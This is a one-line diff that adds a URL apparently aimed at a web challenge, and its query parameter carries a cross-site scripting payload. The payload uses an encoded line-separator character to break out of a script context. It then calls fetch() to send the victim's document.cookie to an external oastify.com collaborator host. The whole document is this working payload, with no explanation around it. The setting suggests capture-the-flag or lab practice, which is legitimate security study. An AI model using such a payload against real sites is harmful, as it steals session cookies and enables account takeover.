@@ -1,0 +1,1 @@
+https://challenge/?status=%E2%80%A8fetch('http://onf4inwecka29oo5mcagsxkuqlwck48t.oastify.com/'%2bdocument.cookie);//
